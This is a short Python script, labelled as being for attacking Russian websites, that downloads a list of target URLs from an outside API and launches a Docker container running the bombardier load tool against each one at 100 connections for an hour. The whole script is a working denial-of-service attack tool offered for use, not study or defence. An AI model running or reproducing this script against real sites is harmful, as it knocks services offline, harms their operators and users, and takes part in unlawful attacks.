# This is a sample Python script for kill russians sites.
import requests
import json
import docker

if __name__ == '__main__':
    urls = json.loads(requests.get('https://itarmy.pp.ua/api/?type=online').text)

    client = docker.from_env()
    for url in urls:
        cont = client.containers.run("alpine/bombardier:latest", f'-c 100 -d 3600s -l {url}', detach=True)
        print(cont.logs())

